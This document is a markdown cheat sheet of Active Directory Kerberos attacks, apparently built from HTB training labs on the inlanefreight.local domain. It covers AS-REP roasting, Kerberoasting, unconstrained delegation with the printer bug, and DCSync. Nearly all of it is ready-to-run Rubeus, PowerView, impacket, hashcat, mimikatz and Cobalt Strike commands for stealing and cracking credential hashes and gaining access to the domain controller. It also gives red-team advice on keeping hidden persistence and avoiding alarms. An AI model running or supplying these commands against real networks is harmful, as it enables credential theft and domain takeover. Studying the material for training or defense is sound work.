# Roasting Attacks

## ASREP Roasting

### Enumeration

#### PowerShell Enumeration of accounts with DONT_REQ_PREAUTH
```PowerShell
Import-Module .\PowerView.ps1
```

```PowerShell
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```

#### ==COBALT STRIKE: Enumeration of accounts with DONT_REQ_PREAUTH==
```cobalt
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
```

#### Performing ASREP Roasting with Rubeus
```PowerShell
.\Rubeus.exe asreproast /user:jenna.smith /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:hashes.txt
```

#### ==COBALT STRIKE: Performing ASREP Roasting with Rubeus==
```cobalt
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap
```

#### Cracking the hash with Hashcat
```cmd.exe
hashcat.exe -m 18200 C:\Tools\hashes.txt C:\Tools\rockyou.txt -O
```

### Set DONT_REQ_PREAUTH with PowerView

- A possible attack vector: If an attacker has GenericWrite or GenericAll permissions over an account, they can enable this attribute and obtain the AS_REP ticket for offline cracking to recover the account's password before disabling it again.

#### Set DONT_REQ_PREAUTH with PowerView
```PowerShell
Set-DomainObject -Identity userName -XOR @{useraccountcontrol=4194304} -Verbose
```
Make sure to replace "userName" with the actual username of the victim account

## ASREP Roasting from Linux

- *Note: When working with Kerberos on Linux, we need to use the target's DNS server or configure our host machine with the corresponding DNS entries for the domain we are targetting. That is, we need to have an entry in /etc/hosts for the domain/Domain Controller before attacking it.*

### From an authenticated account

#### AS-REP Roastable Users Enumeration
```Shell
impacket-GetNPUsers inlanefreight.local/pixis
```

#### Requesting AS-REP Roastable Hashes
```Shell
impacket-GetNPUsers inlanefreight.local/pixis -request
```

### From an unauthenticated account

#### Finding AS-REP Roastable Accounts w/o Authentication
```Shell
impacket-GetNPUsers INLANEFREIGHT/ -dc-ip 10.129.205.35 -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass
```

### ==Red Team Usage for AS-REP Roasting==
- **Persistence:** Setting this bit (i.e., the DONT_REQ_PREAUTH flag) on accounts would allow attackers to regain access to accounts in case of a password change. This is useful because it lets the team establish persistence on boxes that are likely outside the scope of monitoring (e.g., Printers) and still have a high probability of gaining access to the domain at any time. We may see this setting enabled on service accounts used by old management applications, and if discovered, the blue team may ignore them.
- **Privilege Escalation:** There are many scenarios where an attacker can change any attribute of an account but not the ability to log in without knowing or resetting the password. Password resets are dangerous as they have a high probability of raising alarms. Instead of resetting the password, attackers can enable this bit and attempt to crack the account's password hash.

## Kerberoasting

- Requires a valid domain user account or a SYSTEM (or low privileged domain account) shell on a domain-joined machine

### Manual Detection (Windows)

#### LDAP Query for users exposing a service
```ldap
&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)
```

#### PowerShell script that automates finding these accounts in an environment
```PowerShell
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
$results = $search.Findall()
foreach($result in $results)
{
    $userEntry = $result.GetDirectoryEntry()
    Write-host "User" 
    Write-Host "===="
    Write-Host $userEntry.name "(" $userEntry.distinguishedName ")"
        Write-host ""
    Write-host "SPNs"
    Write-Host "===="     
    foreach($SPN in $userEntry.servicePrincipalName)
    {
        $SPN       
    }
    Write-host ""
    Write-host ""
}
```
This script connects to the Domain Controller and searches for all objects that match our provided filter. Each result shows us its name (Distinguished Name) and the list of SPNs associated with this account.

### Automated Tools (Windows)

#### Enumerating SPN with PowerView
```PowerShell
Import-Module .\PowerView.ps1
```

```PowerShell
Get-DomainUser -SPN
```

#### Using PowerView to perform the Kerberoasting attack
```PowerShell
Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv -notypeinformation
```

```PowerShell
cat .\tgs.csv
```

#### Using the Invoke-Kerberoast function to perform Kerberoasting
```PowerShell
Import-Module .\PowerView.ps1
```

```PowerShell
Invoke-Kerberoast
```

#### Using Rubeus to Kerberoast all available users and return their hashes for offline cracking
```cmd.exe
Rubeus.exe kerberoast /nowrap
```

#### ==COBALT STRIKE: Using Rubeus to Kerberoast all available users and return their hashes for offline cracking==
```cobalt
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap
```

#### Using Rubeus to Kerberoast a specific user and write the result to a file
```cmd.exe
Rubeus.exe kerberoast /nowrap /user:jacob.kelly /outfile:filename.txt
```
We could use the /pwdsetafter and /pwdsetbefore arguments to Kerberoast accounts whose password was set within a particular date; this can be helpful to us, as sometimes we find legacy accounts with a password set many years ago that is outside of the current password policy and relatively easy to crack.

#### ==COBALT STRIKE: Using Rubeus to Kerberoast a specific user and write the result to a file==
```cobalt
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap /user:jacob.kelly
```

- We will know the difference because an RC4 encrypted ticket will return a hash that starts with the $krb5tgs$23$* prefix, while AES encrypted tickets will give us a hash that begins with $krb5tgs$18$*.

### Hash Cracking

#### Cracking Kerberoastable Hashes with hashcat
```cmd.exe
hashcat.exe -m 13100 C:\Tools\kerb.txt C:\Tools\rockyou.txt -O
```

### Kerberoasting without an Account Password

To perform this attack, we need the following:
- Username of an account with pre-authentication disabled (DONT_REQ_PREAUTH).
- A target SPN or a list of SPNs.

#### Execute Rubeus createnetonly
```cmd.exe
Rubeus.exe createnetonly /program:cmd.exe /show
```
Rubeus will utilize its CMD window to perform this attack

**From the new cmd window opened, we will perform the attack; if we try to run the Kerberoast option, it will fail because we are not authenticated.**

#### Performing the Attack *without* /nopreauth
```cmd.exe
Rubeus.exe kerberoast
```

**Now include a user with `DONT_REQ_PREAUTH` set (e.g., `amber.smith`) and an SPN such as `MSSQLSvc/SQL01:1433`, it will return a ticket**

#### Performing the attack *with* /nopreauth
```cmd.exe
Rubeus.exe kerberoast /nopreauth:amber.smith /domain:inlanefreight.local /spn:MSSQLSvc/SQL01:1433 /nowrap
```

***Note: Instead of /spn we can use /spns:listofspn.txt to try multiple SPNs*

#### ==COBALT STRIKE: =Performing the attack using Rubeus *with* /nopreauth==
```cobalt
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /nopreauth:amber.smith /domain:inlanefreight.local /spn:MSSQLSvc/SQL01:1433 /nowrap 
```

## Kerberoasting from Linux

#### Enumerating SPNs
```Shell
impacket-GetUserSPNs inlanefreight.local/htb-student
```

#### Request TGS ticket / Service Ticket (ST) for kerberoastable accounts identified in previous command
```Shell
impacket-GetUserSPNs inlanefreight.local/htb-student -request
```

#### Cracking the hashes associated with accounts
```cmd.exe
hashcat.exe -m 13100 C:\Tools\kerb.txt C:\Tools\rockyou.txt -O
```

## Unconstrained Delegation

#### Monitor Stored Tickets with Rubeus
```PowerShell
\Rubeus.exe monitor /interval:5 /nowrap
```

#### ==COBALT STRIKE: Monitor Stored Tickets with Rubeus==
```cobalt
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:5 /nowrap
```

#### Identify groups that the user belongs to
```PowerShell
Import-Module .\PowerView.ps1
```

```PowerShell
Get-DomainGroup -MemberIdentity sarah.lafferty
```
*In example, she's in the Domain Admins group*
#### ==COBALT STRIKE: Identify groups that the user belongs to==
```cobalt
powershell Get-DomainGroup -MemberIdentity sarah.lafferty
```

### Use the TGT to access the Domain Controller's CIFS service

#### Using the TGT to Request a TGS for the CIFS service
```PowerShell
.\Rubeus asktgs /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /service:cifs/dc01.INLANEFREIGHT.local /ptt
```

#### If previous command is unsuccessful, use *renew action* to get a new TGT
```PowerShell
.\Rubeus.exe renew /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /ptt
```

Once a TGT or TGS is obtained, we can list the contents of the DC file system
#### Using the ticket
```PowerShell
dir \\dc01.inlanefreight.local\c$
```

We could also get a TGS ticket for the LDAP service and ask for synchronization with the DC to get all the users' password hashes

### Leveraging Printer Bug

#### Monitoring for Tickets with Rubeus
```PowerShell
.\Rubeus.exe monitor /interval:5 /nowrap
```

#### Running SpoolSample to abuse Printer Bug
```PowerShell
.\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local
```
The syntax for this tool is `SpoolSample.exe <target server> <caputure server>`, where the target server in the example lab is `DC01` and the capture server is `SQL01`.

TGT from target server should be retrieved on console running Rubeus

#### Renewing the ticket with Rubeus
```PowerShell
.\Rubeus.exe renew /ticket:doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCBFVhggRRMIIETaADAgEFoRUbE0lOTEFORUZSRUlHSFQ
uTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggQDMIID/6ADAgESoQMCAQKiggPxBIID7XBw4BNnnymchVY/H/
9966JMGtJhKaNLBt21SY3+on4lrOrHo<SNIP> /ptt
```
With the TGT for DC01$ in memory, you can perform a DCSync
#### Perform DCSync attack to retrieve a target user's NTLM PW hash
```cmd.exe
mimikatz.exe
```

`Mimikatz`
```cmd.exe
lsadump::dcsync /user:sarah.lafferty
```

#### Using an account's hash (e.g., Sarah's rc4) to request a TGT for the DC
```PowerShell
.\Rubeus.exe asktgt /rc4:0fcb586d2aec31967c8a310d1ac2bf50 /user:sarah.lafferty /ptt
```

#### Using Sarah's ticket to get access to DC
```PowerShell
dir \\dc01.inlanefreight.local\c$
```


